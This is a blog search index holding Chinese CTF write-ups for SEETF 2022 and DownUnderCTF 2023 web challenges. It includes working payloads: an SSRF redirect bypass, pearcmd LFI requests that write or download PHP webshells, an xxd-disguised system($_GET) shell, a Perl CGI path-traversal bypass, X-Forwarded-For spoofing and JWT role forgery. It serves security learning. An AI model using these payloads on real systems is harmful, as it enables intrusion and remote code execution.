<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022SEETF</title>
    <url>/2023/08/15/22-20-02/</url>
    <content><![CDATA[<h1>2022SEETF</h1>
<span id="more"></span>
<h2 id="Super-Secure-Requests-Forwarder">Super Secure Requests Forwarder</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> advocate</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        url = request.form[<span class="string">&#x27;url&#x27;</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Prevent SSRF</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            advocate.get(url)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, error=<span class="string">f&quot;The URL you entered is dangerous and not allowed.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, result=r.text)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;flag.html&#x27;</span>, FLAG=os.environ.get(<span class="string">&quot;FLAG&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>), <span class="number">403</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">80</span>, threaded=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在这里存在advocate对ssrf进行防御，需要本地的请求才能访问flag，但是在第二次的url请求中不会进行任何的防御手段，那么就可以对其传入一个不是ssrf的请求，绕过第一次的url请求，但是在第二次的请求中进行ssrf攻击</p>
<p>可以在本地开启一个python服务，在第一次申请的时候返回字符串，在第二次申请的时候返回重定向进行攻击</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">global</span> i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;No&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;http://127.0.0.1/flag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>, threaded=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>补充知识：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for</span><br><span class="line"> </span><br><span class="line">app = Flask(__name__)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index_1&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_1</span>():</span><br><span class="line">    <span class="comment"># 重定向到视图函数路径</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;t&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index_2&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_2</span>():</span><br><span class="line">    <span class="comment"># url_for构建指定函数的URL，操作对象是函数，不是route里的路径，即得到函数的路由地址</span></span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;test&quot;</span>))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/index_3&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index_3</span>():</span><br><span class="line">    <span class="comment"># 重定向到完整链接</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;http://127.0.0.1:5000/t&quot;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/t&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;test&quot;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;127.0.0.1&quot;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure>
<p>然后使用ngrok进行内网穿透，当然也可以用一台vps挂载服务到公网上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ngrok http 1337</span><br></pre></td></tr></table></figure>
<p>最后就可以返回最终的结果了</p>
<h2 id="Sourceless-Guessy-Web">Sourceless Guessy Web</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//通过本地直接写入webshell,注意这里最好抓包然后用burpsuite或者直接curl执行，否则浏览器会将&lt; ? &gt; 转义</span><br><span class="line">// config-create可以直接创建配置文件，且第一个参数必须以/开头</span><br><span class="line">http://ip:port/include.php?f=pearcmd&amp;+config-create+/&lt;?=phpinfo();?&gt;+/tmp/evil.php</span><br><span class="line">// 通过远程直接下载webshell</span><br><span class="line">// web目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/var/www/html+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/tmp/pear/download/evil.php</span><br><span class="line">// tmp目录可写</span><br><span class="line">- http://ip:port/include.php?f=pearcmd&amp;+install+-R+/tmp+http://ip:port/evil.php</span><br><span class="line">- http://ip:port/include.php?f=/tmp/pear/download/evil</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>找到pear.php的路径，然后写文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?page=../../../../../../../../usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=system(&#x27;/readflag&#x27;);?&gt;+/tmp/evil.php</span><br></pre></td></tr></table></figure>
<p>最后访问文件即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?page=../../../../../../../../tmp/evil.php</span><br></pre></td></tr></table></figure>
<p>中间若是黑盒测试，使用$IFS绕过空格即可（ls$IFS/），可以得到根目录下的readflag</p>
]]></content>
      <categories>
        <category>2022wp</category>
      </categories>
      <tags>
        <tag>2022ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>2023DownUnderCTF</title>
    <url>/2023/09/08/14-20-17/</url>
    <content><![CDATA[<h1>2023DownUnderCTF</h1>
<span id="more"></span>
<h2 id="web">web</h2>
<h3 id="proxed">proxed</h3>
<p>直接使用XFF即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 31.33.33.7</span><br></pre></td></tr></table></figure>
<h3 id="static-file-server">static-file-server</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /files/../../../../../../flag.txt HTTP/1.1</span><br><span class="line">Host: 172.19.236.162:1337</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.69</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://172.19.236.162:1337/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6</span><br><span class="line">If-None-Match: &quot;178158b25fa3a400-1e&quot;</span><br><span class="line">If-Modified-Since: Sun, 03 Sep 2023 09:14:18 GMT</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="xxd-server">xxd-server</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xxd</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$s</span></span>): <span class="title">string</span> </span>&#123;</span><br><span class="line">	<span class="variable">$out</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">	<span class="variable">$ctr</span> = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$s</span>, <span class="number">16</span>) <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">		<span class="variable">$hex_string</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27; &#x27;</span>, <span class="title function_ invoke__">str_split</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="variable">$v</span>), <span class="number">4</span>));</span><br><span class="line">		<span class="variable">$ascii_string</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="keyword">foreach</span> (<span class="title function_ invoke__">str_split</span>(<span class="variable">$v</span>) <span class="keyword">as</span> <span class="variable">$c</span>) &#123;</span><br><span class="line">			<span class="variable">$ascii_string</span> .= <span class="variable">$c</span> &lt; <span class="string">&#x27; &#x27;</span> || <span class="variable">$c</span> &gt; <span class="string">&#x27;~&#x27;</span> ? <span class="string">&#x27;.&#x27;</span> : <span class="variable">$c</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%08x: %-40s %-16s\n&quot;</span>, <span class="variable">$ctr</span>, <span class="variable">$hex_string</span>, <span class="variable">$ascii_string</span>);</span><br><span class="line">		<span class="variable">$ctr</span> += <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">xxd</span>(<span class="string">&quot;&lt;?php /*        */system(\$_GET/**/[\&quot;cmd\&quot;]);/*   */ ?&gt;&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>对于上面xxd可以使用注释构造出特定的shell文件，然后进行命令执行即可以</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/*        */</span><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span><span class="comment">/**/</span>[<span class="string">&quot;cmd&quot;</span>]);<span class="comment">/*   */</span> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="cgi-fridays">cgi-fridays</h3>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">sub</span> <span class="title">route_request</span> </span>&#123;</span><br><span class="line">	<span class="keyword">my</span> ($page, $remote_addr) = @_;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^about$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/about.txt&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^version$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/version&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^cpuinfo$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;/proc/cpuinfo&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ($page =~ <span class="regexp">/^stat|io|maps$/</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/denied.txt&#x27;</span> <span class="keyword">unless</span> $remote_addr eq <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;/proc/self/$page&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> HTDOCS . <span class="string">&#x27;/pages/home.txt&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>需要同时是本地发起的请求，而且目录存在<code>stat|io|maps</code>的字样</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="keyword">my</span> $q = CGI::Minimal-&gt;new;</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;Content-Type: text/html\r\n\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">my</span> $file_path = route_request($q-&gt;param(<span class="string">&#x27;page&#x27;</span>), $ENV&#123;<span class="string">&#x27;REMOTE_ADDR&#x27;</span>&#125;);</span><br><span class="line"><span class="keyword">my</span> $file_content = read_file($file_path);</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> escape_html($file_content);</span><br></pre></td></tr></table></figure>
<p>根据blackhat的一篇文章</p>
<p><a href="https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf">https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf</a></p>
<p>可以知道<code>$q-&gt;param('page')</code>将会获得一个list，那么只要多个赋值就会覆盖$remote_addr</p>
<p>然后使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find -name <span class="string">&quot;*io*&quot;</span></span><br></pre></td></tr></table></figure>
<p>找出一个含有io的目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://localhost:5000/?page=../../sys/bus/virtio/../../../../flag.txt&amp;page=127.0.0.1&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="actually-proxed">actually-proxed</h3>
<p>在proxy的main.go中，存在一个</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> headers &#123;</span><br><span class="line">		<span class="keyword">if</span> strings.ToLower(v[<span class="number">0</span>]) == <span class="string">&quot;x-forwarded-for&quot;</span> &#123;</span><br><span class="line">			headers[i][<span class="number">1</span>] = fmt.Sprintf(<span class="string">&quot;%s, %s&quot;</span>, v[<span class="number">1</span>], clientIP)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>对于这个对xff的过滤，实际上没有什么用，因为只会对第一个xff进行处理，但是如果放入两个xff，就会成功绕过</p>
<p>然后在真正get flag的地方会将xff的最后一个传入给ip，然后成功绕过</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&#x27;X-Forwarded-For: 31.33.33.7&#x27;</span> -H <span class="string">&#x27;X-Forwarded-For: 31.33.33.7&#x27;</span> 127.0.0.1:8080</span><br></pre></td></tr></table></figure>
<h3 id="grades-grades-grades">grades_grades_grades</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /signup HTTP/1.1</span><br><span class="line">Host: 100.100.1.3:1337</span><br><span class="line">Content-Length: 57</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://100.100.1.3:1337</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://100.100.1.3:1337/signup</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">stu_num=a&amp;stu_email=a%40qq.com&amp;password=a&amp;is_teacher=True</span><br></pre></td></tr></table></figure>
<p>根据逻辑可以伪造<code>is_teacher=True</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        jwt_data = request.form.to_dict()</span><br><span class="line">        jwt_cookie = current_app.auth.create_token(jwt_data)</span><br><span class="line">        <span class="keyword">if</span> is_teacher_role():</span><br><span class="line">            response = make_response(redirect(url_for(<span class="string">&#x27;api.index&#x27;</span>, is_auth=<span class="literal">True</span>, is_teacher_role=<span class="literal">True</span>)))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            response = make_response(redirect(url_for(<span class="string">&#x27;api.index&#x27;</span>, is_auth=<span class="literal">True</span>)))</span><br><span class="line">        </span><br><span class="line">        response.set_cookie(<span class="string">&#x27;auth_token&#x27;</span>, jwt_cookie, httponly=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;signup.html&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>然后用JWT去获取flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /grades_flag HTTP/1.1</span><br><span class="line">Host: 100.100.1.3:1337</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://100.100.1.3:1337</span><br><span class="line">Cookie: auth_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdHVfbnVtIjoiYSIsInN0dV9lbWFpbCI6ImFAcXEuY29tIiwicGFzc3dvcmQiOiJhIiwiaXNfdGVhY2hlciI6IlRydWUifQ.K2c3wh7wWQmWDd6m_hJDA5509mTMYcRRehKUtMtEtyc</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://100.100.1.3:1337/signup</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: 210.37.157.7</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="strapi-in">strapi-in</h3>
<p>这题复现的过程中最难的不是理解，而是docker建立，npm install一直起不来，最后还是npm走一下主机的代理还要升级一下npm才起来的</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> node:<span class="number">18</span>-alpine</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /opt/strapi-in</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./package.json /opt/strapi-in/package.json</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./package-lock.json /opt/strapi-in/package-lock.json</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm config <span class="built_in">set</span> proxy http://ip:10086</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm config <span class="built_in">set</span> https-proxy http://ip:10086</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm <span class="built_in">set</span> progress=<span class="literal">true</span></span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install -g npm@latest</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm install</span></span><br><span class="line"><span class="keyword">ENV</span> PATH /opt/node_modules/.bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">mv</span> /opt/strapi-in/flag.txt /flag.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R node:node /opt/strapi-in/data</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> -R node:node /opt/strapi-in/public/uploads</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chown</span> node:node /opt/strapi-in/.env</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> npm run build</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> node</span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;npm&quot;</span>, <span class="string">&quot;run&quot;</span>, <span class="string">&quot;start&quot;</span>]</span></span><br></pre></td></tr></table></figure>
<p>然后这一题的话是CVE-2023-22621，具体分析可以看</p>
<p><a href="https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22621-ssti-to-rce-by-exploiting-email-templates-in-strapi-versions-455">https://www.ghostccamm.com/blog/multi_strapi_vulns/#cve-2023-22621-ssti-to-rce-by-exploiting-email-templates-in-strapi-versions-455</a></p>
<p>上面那个分析中，比较有价值的是绕过正则表达式的一个手法，还有就是仅仅使用<code>$process.binding(&quot;spawn_sync&quot;).spawn().output()</code>的手法进行payload的构造</p>
<p>如果是真实环境的话，使用下面的poc即可</p>
<p><a href="https://github.com/sofianeelhor/CVE-2023-22621-POC/blob/main/poc.py">CVE-2023-22621-POC/poc.py at main · sofianeelhor/CVE-2023-22621-POC · GitHub</a></p>
<p>这道题目首先用admin的身份登录<code>README.md</code>中有（找半天），然后进行对email的模板进行改变，直接上exp</p>
<p><img src="/img/image-20230910152045585.png" alt="image-20230910152045585" /></p>
<p>因为在dockerfile中限制了权限，没有办法进行反弹bash的操作（甚至限制了curl）</p>
<p><img src="/img/image-20230910152323396.png" alt="image-20230910152323396" /></p>
<p><img src="/img/image-20230910152520657.png" alt="image-20230910152520657" /></p>
<h3 id="smooth-jazz">smooth-jazz</h3>
<p>参考：</p>
<p><a href="https://blog.antoniusblock.net/posts/smooth-jazz/">https://blog.antoniusblock.net/posts/smooth-jazz/</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mysql_fquery</span>(<span class="params"><span class="variable">$mysqli</span>, <span class="variable">$query</span>, <span class="variable">$params</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$mysqli</span>, <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$query</span>, <span class="variable">$params</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$mysqli</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;DB_HOST&#x27;</span>), <span class="string">&#x27;challuser&#x27;</span>, <span class="string">&#x27;challpass&#x27;</span>, <span class="string">&#x27;challenge&#x27;</span>);</span><br><span class="line">  <span class="variable">$username</span> = <span class="title function_ invoke__">strtr</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>], [<span class="string">&#x27;&quot;&#x27;</span> =&gt; <span class="string">&#x27;\\&quot;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span> =&gt; <span class="string">&#x27;\\\\&#x27;</span>]);</span><br><span class="line">  <span class="variable">$password</span> = <span class="title function_ invoke__">sha1</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;&#x27;</span>.<span class="variable">$username</span>.<span class="string">&#x27;&quot; AND password = &quot;%s&quot;&#x27;</span>, [<span class="variable">$password</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Invalid password.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$htmlsafe_username</span> = <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$username</span>, ENT_COMPAT | ENT_SUBSTITUTE);</span><br><span class="line">  <span class="variable">$greeting</span> = <span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> </span><br><span class="line">      ? <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s and the flag is %s&quot;</span></span><br><span class="line">      : <span class="string">&quot;Hello <span class="subst">$htmlsafe_username</span>, the server time is %s&quot;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="variable">$message</span> = <span class="title function_ invoke__">vsprintf</span>(<span class="variable">$greeting</span>, [<span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>), <span class="title function_ invoke__">getenv</span>(<span class="string">&#x27;FLAG&#x27;</span>)]);</span><br><span class="line">  </span><br><span class="line">  fail:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一步：</p>
<p>username的字符截断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin == admin%ff+any</span><br></pre></td></tr></table></figure>
<p>第二步</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$res</span> = <span class="title function_ invoke__">mysql_fquery</span>(<span class="variable">$mysqli</span>, <span class="string">&#x27;SELECT * FROM users WHERE username = &quot;%s&quot;&#x27;</span>, [<span class="variable">$username</span>]);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="title function_ invoke__">mysqli_fetch_assoc</span>(<span class="variable">$res</span>)) &#123;</span><br><span class="line">     <span class="variable">$message</span> = <span class="string">&quot;Username not found.&quot;</span>;</span><br><span class="line">     <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>使用了<code>mysql_fquery</code>函数对其进行处理</p>
